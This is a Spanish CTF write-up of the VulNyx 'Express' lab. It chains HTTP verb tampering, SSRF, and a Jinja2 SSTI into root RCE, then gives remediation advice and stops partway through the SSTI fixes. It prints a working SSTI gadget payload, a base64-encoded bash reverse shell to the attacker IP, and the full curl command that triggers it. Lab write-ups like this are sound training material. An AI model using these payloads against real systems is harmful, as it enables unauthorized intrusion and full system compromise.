# Vulnyx — Express

> Laboratorio de pentesting en un entorno controlado. Este documento describe únicamente las pruebas realizadas sobre la máquina **Express** de VulNyx.

---

## Información de la máquina
<img width="555" height="320" alt="image" src="https://github.com/user-attachments/assets/3646ebfb-a153-46ed-a235-84931ae9bc74" />

| Campo | Valor |
|-------|-------|
| **Máquina** | Express |
| **Plataforma** | Vulnyx |
| **IP objetivo** | `192.168.0.16` |
| **IP atacante (Kali)** | `192.168.0.13` |
| **Sistema operativo** | Linux — Debian 12 *"Bookworm"* |
| **Puertos expuestos** | 22 (SSH), 80 (HTTP) |
| **Técnicas clave** | Virtual Host enumeration · HTTP Verb Tampering · SSRF · SSTI (Jinja2) → RCE |
| **Resultado** | Acceso como **root** (sin privesc: el servicio vulnerable corría como root) |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
   - 1.1 [Descubrimiento de host (ARP)](#11-descubrimiento-de-host-arp)
   - 1.2 [Escaneo de puertos](#12-escaneo-de-puertos)
2. [Enumeración web (puerto 80)](#2-enumeración-web-puerto-80)
   - 2.1 [Inspección inicial](#21-inspección-inicial)
   - 2.2 [Fuzzing de directorios sobre la IP (callejones sin salida)](#22-fuzzing-de-directorios-sobre-la-ip-callejones-sin-salida)
   - 2.3 [Descubrimiento del Virtual Host `express.nyx`](#23-descubrimiento-del-virtual-host-expressnyx)
   - 2.4 [Enumeración recursiva del vhost](#24-enumeración-recursiva-del-vhost)
3. [Análisis de la API](#3-análisis-de-la-api)
   - 3.1 [Mapeo de endpoints en `api.js`](#31-mapeo-de-endpoints-en-apijs)
   - 3.2 [Los dos controles de acceso: `key` y `token`](#32-los-dos-controles-de-acceso-key-y-token)
4. [Explotación](#4-explotación)
   - 4.1 [HTTP Verb Tampering en `/api/users`](#41-http-verb-tampering-en-apiusers)
   - 4.2 [SSRF en `/api/admin/availability`](#42-ssrf-en-apiadminavailability)
   - 4.3 [Intento de LFI con `file://` y qué nos reveló el error](#43-intento-de-lfi-con-file-y-qué-nos-reveló-el-error)
   - 4.4 [Escaneo de puertos internos vía SSRF](#44-escaneo-de-puertos-internos-vía-ssrf)
   - 4.5 [SSTI (Jinja2) en el servicio interno del puerto 9000](#45-ssti-jinja2-en-el-servicio-interno-del-puerto-9000)
   - 4.6 [De SSTI a Reverse Shell](#46-de-ssti-a-reverse-shell)
5. [Post-explotación y flags](#5-post-explotación-y-flags)
6. [Cadena de ataque (resumen)](#6-cadena-de-ataque-resumen)
7. [Conclusiones y remediación](#7-conclusiones-y-remediación)

---

## 1. Reconocimiento

### 1.1 Descubrimiento de host (ARP)

Identificamos nuestra propia interfaz y el rango en el que estamos:

```bash
ip -br addr
ip route
```

<img width="1131" height="57" alt="Identificación segmento de red" src="https://github.com/user-attachments/assets/68380acd-a9c5-47d6-95be-deb63c48ae4c" />

<img width="619" height="53" alt="Identificación puerta de enlace" src="https://github.com/user-attachments/assets/1bcfd9ee-a0cf-4ef5-a367-164e4d882851" />

**Explicación:** estamos en `192.168.0.13/24`, con gateway en `192.168.0.1`. Al compartir segmento `/24` con el objetivo, el método de descubrimiento más fiable es **ARP** (capa 2): no depende de ICMP ni de reglas de firewall de capa 3, porque cualquier host que quiera comunicarse en la LAN *tiene* que responder ARP. Usamos `nmap -sn -PR` (Ping scan con ARP Request):

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

<img width="537" height="489" alt="image" src="https://github.com/user-attachments/assets/bfb8a2ed-1b35-413d-80a8-837e61da2792" />

Para quedarnos solo con los hosts vivos, filtramos la salida `.gnmap`:

```bash
awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
```

<img width="532" height="165" alt="ARP Host Discovery List" src="https://github.com/user-attachments/assets/7a050a23-67a6-4bbc-a5ef-cd06d965d742" />

---

### 1.2 Escaneo de puertos

Con el objetivo ubicado, mapeamos **todos** los puertos TCP. Nunca escaneamos solo los "comunes": un servicio escondido en un puerto alto es, muchas veces, el corazón del laboratorio.

```bash
sudo nmap -sS -p- 192.168.0.16 -oA port-scanning-full-tcp-192.168.0.16
```

<img width="620" height="184" alt="Port Discovery Scan" src="https://github.com/user-attachments/assets/a4947d7d-8a2b-495d-a8a6-c3fc3ab23654" />

**Hallazgo:** solo **22/tcp** y **80/tcp** abiertos; los 65.533 restantes, cerrados. Esto es importante para después: cualquier servicio adicional que encontremos vivirá en **localhost** (loopback), inalcanzable desde afuera. Guardá este dato mentalmente.

Acto seguido, fingerprinting de versión y scripts por defecto sobre los dos puertos:

```bash
sudo nmap -sV -p 22,80 192.168.0.16 -oA service-detection-inicial-192.168.0.16
```

<img width="792" height="217" alt="Service Scan  22 80" src="https://github.com/user-attachments/assets/6abcba05-7cd1-41d6-aa6c-2ae3035a3bc2" />

**Resultado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian 2+deb12u3 |
| 80/tcp | HTTP | Apache httpd 2.4.62 (Debian) |

El `2+deb12u3` del SSH nos ancla el SO en **Debian 12 (Bookworm)**. Sin credenciales, el SSH no es un punto de entrada todavía, así que toda la atención va al **puerto 80**.

---

## 2. Enumeración web (puerto 80)

### 2.1 Inspección inicial

Antes de disparar fuzzers, miramos el sitio "a mano". Tres chequeos rápidos:

**Cabeceras HTTP** (nos dicen tecnología, fechas, redirecciones):

```bash
curl -I http://192.168.0.16 | tee http-headers-inicial-192.168.0.16.txt
```

<img width="661" height="212" alt="Inspección de cabeceras HTTP 80" src="https://github.com/user-attachments/assets/1c123889-8d54-4797-99f8-fbbccec9e5b0" />

**`robots.txt`** (a veces lista rutas "ocultas"):

```bash
curl -i http://192.168.0.16/robots.txt | tee http-robots-inicial-192.168.0.16.txt
```

<img width="702" height="308" alt="Inspección de archivo robotstxt 80" src="https://github.com/user-attachments/assets/5dcc4169-f57b-408c-979d-6cac7981dd79" />

**La página en el navegador:**

<img width="1030" height="626" alt="Inspección puerto 80 en navegador Página Apache default" src="https://github.com/user-attachments/assets/1961d843-299d-45b9-adcf-b6906c2ab376" />

**Hallazgos:** no hay `robots.txt`, y la raíz devuelve la **página por defecto de Apache2 ("It works!")**. Esto es una señal, no un fracaso. Una default page significa que **el `VirtualHost` por defecto no apunta a ninguna aplicación real**. En servidores Apache con *name-based virtual hosting*, el sitio "de verdad" a menudo solo responde cuando enviamos la cabecera `Host:` correcta.

---

### 2.2 Fuzzing de directorios sobre la IP (callejones sin salida)

Aun con la sospecha del vhost, agotamos primero el contenido accesible por IP. Empezamos con una wordlist chica:

```bash
gobuster dir -u http://192.168.0.16 -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-common-192.168.0.16.txt
```

<img width="987" height="403" alt="Gobuster Directory Scan" src="https://github.com/user-attachments/assets/f6e4cefb-b588-43d8-b79a-5d88434a5d91" />

Aparece un directorio `/javascript/` (301). Lo enumeramos un nivel más abajo:

```bash
gobuster dir -u http://192.168.0.16/javascript/ -w /usr/share/wordlists/dirb/common.txt -t 10 -x js,txt,html,php -o gobuster-common-nivel2-192.168.0.16.txt
```

<img width="1258" height="602" alt="Gobuster Directory Scan nivel 2" src="https://github.com/user-attachments/assets/791ed160-4bcd-446b-b184-3a2c5ca41779" />

**Hallazgo:** `/javascript/jquery/`. Esto es simplemente el directorio por defecto del paquete Debian `libjs-jquery` — una librería **estática del lado del cliente**. Como vector server-side no aporta nada (jQuery no se "explota" desde el servidor), así que no invertimos tiempo ahí.

Para descartar contenido oculto con seguridad, pasamos la wordlist mediana completa:

```bash
gobuster dir -u http://192.168.0.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30 -o gobuster-medium.txt
```

<img width="1213" height="373" alt="Gobuster Directory Medium" src="https://github.com/user-attachments/assets/d32ec836-bbee-4059-a7e0-034974d30a3b" />

**Conclusión de esta rama:** 882.232 peticiones y **cero contenido nuevo** (solo `index.html`, `javascript`, `server-status`). El fuzzing de directorios por IP está **oficialmente agotado**. Esto refuerza con fuerza la hipótesis del Virtual Host: si la app existe pero no aparece por IP, es porque responde a otro `Host:`.

---

### 2.3 Descubrimiento del Virtual Host `express.nyx`

Vulnyx utiliza por convención el TLD **`.nyx`** con el nombre del laboratorio como hostname. Siendo esta la máquina "Express", probablemente es **`express.nyx`**. Lo registramos en `/etc/hosts` apuntando al objetivo:

```bash
echo "192.168.0.16   express.nyx" | sudo tee -a /etc/hosts
```

> **¿Por qué `/etc/hosts`?** El fuzzing de vhosts con herramientas (ffuf/gobuster `vhost`) no necesita tocar `/etc/hosts` porque la cabecera `Host:` se inyecta directamente. Pero una vez que **ya conocemos** el nombre y queremos navegarlo con el browser o con feroxbuster usando la URL `http://express.nyx/`, el sistema necesita resolver ese nombre a la IP. Ahí es donde entra `/etc/hosts`.

Validamos que, con el `Host:` correcto, Apache sirve una aplicación distinta a la default page. Un gobuster sobre `http://express.nyx/` ya muestra contenido nuevo:

```bash
gobuster dir -u http://express.nyx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,html,txt,php,json -t 30 -o gobuster-express-nyx.txt
```

<img width="1260" height="421" alt="Gobuster Directory Medium con etchosts" src="https://github.com/user-attachments/assets/6e70e640-06bb-4192-b23e-9c8e68f71f08" />

**Hallazgo:** aparecen `/css/`, `/js/` y `/javascript/`. Confirmado el *name-based virtual hosting*: la misma IP, con `Host: 192.168.0.16` sirve "It works!", y con `Host: express.nyx` sirve la aplicación real (un reproductor de música).

---

### 2.4 Enumeración recursiva del vhost

Para bajar automáticamente por cada subdirectorio usamos **feroxbuster**, que es recursivo por defecto (a diferencia de `gobuster dir`, que solo escanea un nivel):

```bash
feroxbuster --url http://express.nyx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,html,txt,php,json -d 3 -r -o ferox-express.txt
```

<img width="1274" height="535" alt="feroxbuster recursive scan" src="https://github.com/user-attachments/assets/07741602-5729-4f9a-ade6-9dbf4d6605ca" />

> **Detalle que confunde a todos:** en feroxbuster, `-r` significa *follow redirects*, **no** "recursive". La recursión viene activada por defecto y se controla la profundidad con `-d`.

**Hallazgo clave:** dos archivos JavaScript propios de la aplicación:
- `http://express.nyx/js/script.js` → lógica del reproductor (UI).
- `http://express.nyx/js/api.js` → **el mapa de la API**. Este es el archivo que nos abre el camino.

---

## 3. Análisis de la API

### 3.1 Mapeo de endpoints en `api.js`

Leer el código front-end es una de las fases más rentables de un pentest web: el cliente nos documenta gratis cómo hablar con el backend. El contenido de `api.js`:

<img width="592" height="567" alt="Análisis manual de js-apijs" src="https://github.com/user-attachments/assets/e5545258-1437-4e1c-90e4-30a917df61fc" />

<img width="547" height="344" alt="Análisis manual de js-apijs2" src="https://github.com/user-attachments/assets/f3539af1-8413-479f-af3e-76b12885f9c8" />

De ahí extraemos **cuatro endpoints**:

| Endpoint | Método | Observación |
|----------|--------|-------------|
| `/api/music/list` | GET | Público. Lista de géneros. Trivial. |
| `/api/music/songs` | GET | Público. Lista de canciones. Trivial. |
| `/api/users?key=${secretKey}` | GET | Requiere un `secretKey` → filtra la lista de usuarios. |
| `/api/admin/availability` | POST (JSON) | Recibe una `url` y la consulta **desde el servidor** → candidato claro a **SSRF**. |

El fragmento más interesante es el último:

```javascript
function checkUrlAvailability() {
    const data = { id: 1, url: 'http://example.com', token: '1234-1234-1234' };
    fetch('/api/admin/availability', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })...
}
```

Un endpoint que acepta una **URL arbitraria** y comprueba su "disponibilidad" server-side es la definición de un **Server-Side Request Forgery**. El `token: '1234-1234-1234'` es un placeholder: hace falta uno válido.

También notamos que `getUsersWithKey()` usa una variable `secretKey` que **no está definida** ni en `api.js` ni en `script.js`. Ese dato será relevante: la key no está hardcodeada en el front.

---

### 3.2 Los dos controles de acceso: `key` y `token`

Probamos los endpoints protegidos con valores vacíos para ver cómo se comportan los controles:

```bash
curl -s "http://express.nyx/api/users?key="
curl -s "http://express.nyx/api/users"
```

<img width="503" height="220" alt="curl a endpoint users sin key y vacio da error" src="https://github.com/user-attachments/assets/902e6b87-3000-4594-ab87-a3d620aca02f" />

**Resultado:** `{"message":"Unauthorized,wrong key!","result":"error"}`. El control de la `key` es real. Lo mismo ocurre con el token del SSRF (lo veremos en 4.2). Tenemos, entonces, **dos puertas cerradas**:
- `/api/users` pide `key`.
- `/api/admin/availability` pide `token`.

Y ninguno de esos valores está en el front-end. La pregunta que guía la explotación es: **¿cómo conseguimos esos secretos?** La respuesta empieza por un fallo de autorización basado en el método HTTP.

---

## 4. Explotación

### 4.1 HTTP Verb Tampering en `/api/users`

El endpoint `/api/users` rechaza peticiones **GET** sin `key`. Pero el control de autorización suele implementarse atado a un método concreto. Si el desarrollador validó la key solo en el handler de `GET` y dejó otro método (p. ej. `POST`) apuntando a la misma lógica de datos sin control, podemos **saltar la autorización cambiando el verbo**. Esto se conoce como **HTTP Verb Tampering**.

```bash
curl -s -X POST http://express.nyx/api/users ; echo
```

<img width="541" height="636" alt="listar usuarios con endpoint users y verb tampering post" src="https://github.com/user-attachments/assets/14838f22-e84a-497b-aabd-e68fa0d8f674" />

**Hallazgo:** el `POST` (sin `key`, con `Content-Length: 0`) **devuelve la lista completa de usuarios**, cada uno con su `id`, `roles`, `token` y `username`. El control que bloqueaba el `GET` no existe para `POST`.

Lo que buscamos es un usuario con rol **`admin`**, porque su `token` es el que abre el SSRF:

<img width="295" height="110" alt="token de usuario con rol admin" src="https://github.com/user-attachments/assets/c9d02693-5928-4631-9183-8f197825f633" />

**Resultado:**
```json
{ "id": 18, "roles": ["admin"], "token": "4493-3179-0912-0597", "username": "JESSS" }
```

Ya tenemos un **token de administrador válido**: `4493-3179-0912-0597`.

---

### 4.2 SSRF en `/api/admin/availability`

Primero demostramos que el token **sí** se valida (para documentar correctamente el control). Con el placeholder:

```bash
curl -s -X POST http://express.nyx/api/admin/availability \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"url":"http://127.0.0.1:80","token":"1234-1234-1234"}' ; echo
```

Respuesta: `{"message":"Unauthorized, wrong token","result":"error"}`. El token placeholder no sirve — por eso necesitábamos el de JESSS.

Ahora, para confirmar el SSRF de forma inequívoca, montamos un servidor web en nuestra Kali y pedimos al objetivo que lo consulte. Si recibimos la petición, el servidor está haciendo requests en nuestro nombre:

```bash
# En Kali
python3 -m http.server 8085
```

```bash
# El SSRF apuntando a nuestra IP
curl -s -X POST http://express.nyx/api/admin/availability \
  -H 'Content-Type: application/json' \
  -d '{"id":18,"token":"4493-3179-0912-0597","url":"http://192.168.0.13:8085"}' ; echo
```

<img width="1213" height="252" alt="Confirmación de ssrf con directory listing reutilizando token" src="https://github.com/user-attachments/assets/f22751bc-00b3-4ff3-a245-f1c067969e97" />

**Hallazgo doble y muy importante:**
1. Nuestro `http.server` registra la conexión entrante desde `192.168.0.16` → **SSRF confirmado**.
2. El campo `response_data` de la respuesta nos devuelve el **cuerpo HTML** de lo que el servidor obtuvo (en este caso, el *directory listing* de nuestra propia Kali, que es lo que sirvió python). Es decir: **el SSRF no es ciego** — podemos *leer* la respuesta de lo que el servidor consulte. Esto multiplica el valor del vector.

---

### 4.3 Intento de LFI con `file://` y qué nos reveló el error

Con un SSRF que devuelve el body, el siguiente salto natural es intentar **leer archivos locales** cambiando el esquema a `file://`:

```bash
curl -s -X POST http://express.nyx/api/admin/availability \
  -H 'Content-Type: application/json' \
  -d '{"id":18,"token":"4493-3179-0912-0597","url":"file:///etc/passwd"}' ; echo
```

<img width="621" height="186" alt="intento leer etcpasswd fallido reutilizando token" src="https://github.com/user-attachments/assets/76ef2256-5b99-4944-8a3f-475a982df34a" />

**Resultado:** `"No connection adapters were found for 'file:///etc/passwd'"`.

**Razonamiento — por qué este error es importante:** ese mensaje es **literal de la librería `requests` de Python**. `requests` solo trae "adapters" para `http://` y `https://`; al no tener uno para `file://`, lanza exactamente ese error. Esto nos dice dos cosas:
- El backend que ejecuta el fetch del SSRF **es Python** (coherente con el header `Server: Werkzeug/3.0.4 Python/3.11.2` que vimos en la respuesta del SSRF → **Flask**).
- **`file://` está descartado.** El SSRF queda limitado a HTTP/HTTPS. No tiene sentido perder tiempo con `gopher://`, `dict://` ni `ftp://`: `requests` tampoco los maneja.

El camino, entonces, no es leer archivos sino **alcanzar servicios HTTP internos**.

---

### 4.4 Escaneo de puertos internos vía SSRF

Recordar el dato de la fase 1.2: externamente **solo** hay 22 y 80. Pero un SSRF nos deja pivotar a `127.0.0.1` del objetivo y tocar servicios que escuchan **solo en loopback**. Usamos el SSRF como un escáner de puertos internos, probando los típicos de aplicaciones web/dev (el default de Flask es **5000**, pero barremos varios):

```bash
for port in 3000 5000 5001 8000 8080 8081 9000 9090 8888 4000 3001; do
  echo -n "== puerto $port =="
  curl -s -X POST http://express.nyx/api/admin/availability \
    -H 'Content-Type: application/json' \
    -d "{\"id\":18,\"token\":\"4493-3179-0912-0597\",\"url\":\"http://127.0.0.1:$port\"}"
  echo; echo
done
```

<img width="606" height="150" alt="encuentro puerto 9000 activo interno" src="https://github.com/user-attachments/assets/c0b0db0f-6b12-419d-96a8-156204f405fc" />

**Hallazgo:** el puerto **9000** responde `"result":"success"` y su `response_data` contiene un formulario:

```html
<form method="get" action="/username">
  <input type="text" name="name" placeholder="Enter your name">
  <input type="submit" value="Greet">
</form>
```

Un endpoint interno `GET /username?name=...` que "saluda" con el nombre recibido. En una app Flask, un valor de usuario que se refleja en la respuesta es el clásico detonante de **Server-Side Template Injection (Jinja2)**.

---

### 4.5 SSTI (Jinja2) en el servicio interno del puerto 9000

Todo lo que sigue se ejecuta **a través del SSRF**: el objetivo consulta `http://127.0.0.1:9000/username?name=<payload>` por nosotros y nos devuelve el resultado en `response_data`.

> **Detalle de encoding:** el payload viaja dentro del parámetro `name` de una URL, que a su vez va dentro de un JSON. Hay que **URL-encodear** las llaves `{{ }}` y los símbolos, o la petición se rompe. Por ejemplo, `{{7*7}}` → `%7B%7B7*7%7D%7D`.

**Paso 1 — reflexión del nombre.** Confirmamos que el parámetro se refleja:

```bash
curl -s -X POST http://express.nyx/api/admin/availability \
  -H 'Content-Type: application/json' \
  -d '{"id":18,"token":"4493-3179-0912-0597","url":"http://127.0.0.1:9000/username?name=hacker"}' ; echo
```

<img width="637" height="163" alt="confirmación de reflexió nde nombre hello hacker" src="https://github.com/user-attachments/assets/b918b0d2-9631-433b-8287-902761cdc4f2" />

Responde `Hello, hacker!`. El input se incrusta en la plantilla.

**Paso 2 — confirmación de Jinja2.** Inyectamos una expresión matemática. Si el motor de plantillas la **evalúa**, veremos el resultado en lugar del texto literal:

```bash
curl -s -X POST http://express.nyx/api/admin/availability \
  -H 'Content-Type: application/json' \
  -d '{"id":18,"token":"4493-3179-0912-0597","url":"http://127.0.0.1:9000/username?name=%7B%7B7*7%7D%7D"}' ; echo
```

<img width="624" height="166" alt="Confirmacion jinja2" src="https://github.com/user-attachments/assets/13d78d2d-6882-42ef-a391-7c238e37ec70" />

**Resultado:** `Hello, 49!`. El `{{7*7}}` se evaluó a `49` → **SSTI confirmado en Jinja2**. Esto no es un XSS: el servidor está renderizando nuestra entrada como código de plantilla, lo que en Jinja2 escala a **ejecución de comandos**.

**Paso 3 — de SSTI a RCE.** Jinja2 corre en un entorno restringido, pero podemos escapar del *sandbox* navegando la jerarquía de objetos de Python hasta alcanzar el módulo `os`. El payload usa el objeto `cycler` (accesible en el contexto de Jinja2) para llegar a sus `__globals__` y desde ahí a `os.popen`:

```
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

URL-encodeado y enviado por el SSRF:

```bash
curl -s -X POST http://express.nyx/api/admin/availability \
  -H 'Content-Type: application/json' \
  -d '{"id":18,"token":"4493-3179-0912-0597","url":"http://127.0.0.1:9000/username?name=%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"}' ; echo
```

<img width="620" height="189" alt="Confirmación de RCE" src="https://github.com/user-attachments/assets/9e135fb2-6c46-42f6-a2f3-fe10fd899f44" />

**Hallazgo crítico:** el `response_data` devuelve `Hello, uid=0(root) gid=0(root) groups=0(root)!`. Tenemos **ejecución remota de comandos**, y además el servicio Flask del puerto 9000 **corre como `root`**. Esto significa que el acceso que obtengamos será directamente privilegiado — no habrá fase de escalada.

> **¿Por qué funciona `cycler.__init__.__globals__.os`?** En Jinja2, `cycler` es una clase expuesta en el contexto de renderizado. `__init__` es su método constructor (un objeto función de Python); todo objeto función guarda en `__globals__` el diccionario de variables globales del módulo donde fue definido. Como ese módulo tiene `os` importado, `__globals__.os` nos entrega el módulo `os` completo, y con `os.popen(...).read()` ejecutamos comandos arbitrarios. Es una de las "gadget chains" estándar para escapar del sandbox de Jinja2.

---

### 4.6 De SSTI a Reverse Shell

Para pasar de ejecutar comandos sueltos a una shell interactiva, inyectamos un **reverse shell de bash**. El problema: un reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`) está lleno de caracteres conflictivos (espacios, `>`, `&`, `/`) que, al atravesar el parámetro `name` de la URL y el JSON, se corrompen. La solución robusta es **codificar el comando en base64** y decodificarlo en el objetivo, evitando casi todos los caracteres problemáticos.

Construcción del payload (en Kali):

```bash
# 1) reverse shell crudo
#    bash -i >& /dev/tcp/192.168.0.13/4444 0>&1
# 2) lo codificamos en base64:
echo -n 'bash -i >& /dev/tcp/192.168.0.13/4444 0>&1' | base64
#    → YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMvNDQ0NCAwPiYx
```

El comando que se ejecuta en el objetivo decodifica y lanza ese payload, usando la sintaxis `{echo,<b64>}|{base64,-d}|bash` (las llaves evitan tener que usar espacios dentro del `popen`):

```
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMvNDQ0NCAwPiYx}|{base64,-d}|bash'
```

Envuelto en el gadget de Jinja2 y URL-encodeado entero, queda el payload final. Levantamos el listener y disparamos:

```bash
# Terminal 1 — listener
nc -lvnp 4444
```

```bash
# Terminal 2 — SSTI vía SSRF con el reverse shell
curl -s -X POST http://express.nyx/api/admin/availability \
  -H 'Content-Type: application/json' \
  -d '{"id":18,"token":"4493-3179-0912-0597","url":"http://127.0.0.1:9000/username?name=%7B%7Bcycler.__init__.__globals__.os.popen%28%22bash%20-c%20%27%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMvNDQ0NCAwPiYx%7D%7C%7Bbase64%2C-d%7D%7Cbash%27%22%29.read%28%29%7D%7D"}'
```

<img width="1261" height="117" alt="Reverse shell lexitosa" src="https://github.com/user-attachments/assets/09238f32-bc40-4b8c-9640-51654d2e6822" />

**Resultado:** la conexión entra desde `192.168.0.16` y obtenemos una shell **`root@express`** (directorio `/opt`). Los errores `cannot set terminal process group` / `no job control` son normales en una shell no interactiva.

Estabilización del TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

---

## 5. Post-explotación y flags

Como el servicio comprometido ya corría como **root**, ambas flags son accesibles de inmediato — no hubo necesidad de escalada de privilegios.

**Flag de usuario** (`/home/jesss/user.txt`):

```bash
cat /home/jesss/user.txt
```

<img width="333" height="66" alt="image" src="https://github.com/user-attachments/assets/390cc26c-6b1f-4dc3-aa5b-fee5a0550353" />


```
969dadb2e8f4aadbxxxxxxxxxx
```

**Flag de root** (`/root/root.txt`):

```bash
cat /root/root.txt
```

<img width="280" height="72" alt="image" src="https://github.com/user-attachments/assets/36e6d5db-3d8e-443a-b5d9-0dd9d0186c53" />

```
17a0c0830e9c716xxxxxxxxxxxxxxxx
```

> **Observación de seguridad:** que el servicio web del puerto 9000 corra como `root` convierte un SSTI en un compromiso total del sistema en un solo salto. Bajo el principio de mínimo privilegio, esa aplicación debería ejecutarse con un usuario sin privilegios; en ese caso, habríamos obtenido una shell limitada y la escalada a root habría sido una fase aparte.

---

## 6. Cadena de ataque (resumen)

```
Recon
  └─ ARP scan → host 192.168.0.16
  └─ nmap -p-  → solo 22 (SSH) y 80 (HTTP)

Enumeración web (80)
  └─ Apache default page  → sospecha de Virtual Host
  └─ dir fuzzing por IP   → agotado (sin app real)
  └─ /etc/hosts: express.nyx  → aparece la app real (name-based vhost)
  └─ feroxbuster → /js/api.js  → mapa de la API

API
  └─ /api/users (GET)                → requiere key  [bloqueado]
  └─ /api/admin/availability (POST)  → requiere token [bloqueado] + huele a SSRF

Explotación
  └─ HTTP Verb Tampering: POST /api/users  → fuga de usuarios + tokens
  │     └─ JESSS (admin) token = 4493-3179-0912-0597
  └─ SSRF /api/admin/availability (no ciego, devuelve body)
  │     └─ file:// falla → backend = Python requests (Flask/Werkzeug)
  │     └─ scan interno → 127.0.0.1:9000 (Flask "Greet")
  └─ SSTI Jinja2 en /username?name=
        └─ {{7*7}} = 49  → confirmación
        └─ cycler.__init__.__globals__.os.popen('id') → uid=0(root)  → RCE
        └─ reverse shell (base64) → root@express

Loot
  └─ user.txt  (/home/jesss)
  └─ root.txt  (/root)   ← servicio vulnerable corría como root
```

---

## 7. Conclusiones y remediación

Esta máquina encadena **cuatro debilidades independientes**, cada una de las cuales por sí sola sería un hallazgo, y juntas producen un compromiso total:

| # | Vulnerabilidad | Causa raíz | Remediación |
|---|----------------|------------|-------------|
| 1 | **HTTP Verb Tampering** en `/api/users` | Autorización atada a un método (GET) y no a la lógica de datos | Centralizar la validación de la `key` para **todos** los métodos; denegar por defecto los verbos no previstos |
| 2 | **SSRF** en `/api/admin/availability` | El servidor hace requests a URLs controladas por el usuario | Validar/whitelistear destinos; bloquear IPs privadas y loopback; prohibir esquemas no-HTTP |
| 3 | **SSTI (Jinja2)** en el servicio del puerto 9000 | Entrada de usuario concatenada en una plantilla (`render_template_string` o similar) | Nunca construir plantillas con input del usuario; usar plantillas estáticas con contexto parametrizado y autoescape |
| 4 | **Servicio ejecutándose como root** | El proceso Flask del 9000 corre con privilegios máximos | Aplicar mínimo privilegio: usuario de servicio dedicado, systemd sandboxing, contenedores |

**Lecciones aprendidas:**
- Una **página por defecto de Apache** no es un callejón sin salida: es una pista de *virtual hosting*. Conocer las convenciones de la plataforma (Vulnyx usa `.nyx`) acelera el descubrimiento.
- El **código JavaScript del cliente** documenta la API por nosotros. Leerlo es más rentable que fuzzear a ciegas.
- Los **mensajes de error** son inteligencia: `No connection adapters` delató el backend Python y nos ahorró perseguir esquemas imposibles.
- Un **SSRF que devuelve el body** se convierte en un escáner y lector de la red interna — mucho más potente que uno ciego.
- El **encoding** (URL-encode + base64) es la diferencia entre un payload que funciona y uno que se rompe silenciosamente al atravesar capas (JSON → URL → shell).

# Vulnyx — Express | Remediaciones y enfoque defensivo

> Complemento *blue team* del writeup de la máquina **Express**. Esta máquina es un caso de estudio ideal porque **ningún fallo por sí solo otorga root**: es la *cadena* la que compromete el sistema. Cada eslabón tenía una barrera que, de existir, habría cortado el ataque. El atacante necesita que fallen **todas**; el defensor necesita que **una** aguante.

---

**Posibles mejoras de seguridad para aprender**

## 1. HTTP Verb Tampering → Autorización centralizada y *deny by default*

**El fallo:** el control de la `key` vivía solo en el handler de `GET`. El `POST` alcanzaba la misma lógica de datos sin pasar por el guard.

**Lección defensiva:** la autorización **nunca** se ata a un método ni a una ruta puntual; se aplica como middleware antes de tocar la lógica, y lo que no está explícitamente permitido se rechaza.

```javascript
// MAL: control pegado a un verbo concreto
app.get('/api/users', (req, res) => {
  if (req.query.key !== SECRET) return res.status(401).json({error:'nope'});
  return res.json(users);
});
app.post('/api/users', (req, res) => res.json(users)); // ← olvidaron el guard

// BIEN: middleware que corre para TODOS los métodos de la ruta
const requireAuth = (req, res, next) => { /* valida token/sesión */ next(); };
app.all('/api/users', requireAuth, usersController);   // all = cualquier verbo
```

**Regla de oro:** devolver **405 Method Not Allowed** para los verbos no previstos, en lugar de dejar que "caigan" en el handler que sí tiene datos.

---

## 2. SSRF → Allowlist de destino, no blocklist

**El fallo:** el endpoint aceptaba una URL arbitraria y la consultaba server-side. Peor aún: devolvía el *body* (SSRF no ciego) y podía alcanzar `127.0.0.1`.

**Remediaciones en capas** (se aplican todas, no una sola):

- **Allowlist, no blocklist.** No intentes "bloquear IPs malas": siempre se escapa alguna representación (`127.0.0.1`, `0.0.0.0`, `[::1]`, `127.1`, decimal `2130706433`, DNS rebinding). Definí la **lista corta de destinos legítimos** y rechazá todo lo demás.
- **Resolvé el DNS vos, validá la IP y conectate a esa IP.** Evita el *DNS rebinding* (el dominio resuelve a algo público durante la validación y a `127.0.0.1` en la conexión real).
- **Bloqueá rangos internos** tras resolver: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16` (metadata cloud `169.254.169.254`), `::1`, `fc00::/7`.
- **Restringí el esquema** explícitamente a `http`/`https` (en esta máquina `requests` ya lo hacía sin querer, pero hay que hacerlo a propósito).
- **Desactivá los redirects** o re-validá cada salto (`allow_redirects=False`): un `302` hacia `http://127.0.0.1` saltea tu validación inicial.
- **Segmentación de red:** el servicio que hace el fetch no debería poder hablar con `localhost:9000` ni con otros servicios internos. Firewall de egreso y no exponer todo sobre la misma interfaz loopback.

```python
import ipaddress, socket
from urllib.parse import urlparse

def url_segura(url):
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        raise ValueError("esquema no permitido")
    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
        raise ValueError("destino interno bloqueado")
    return str(ip)  # conectate a ESTA ip, no al hostname
```

---

## 3. SSTI → El input del usuario nunca es parte de la plantilla

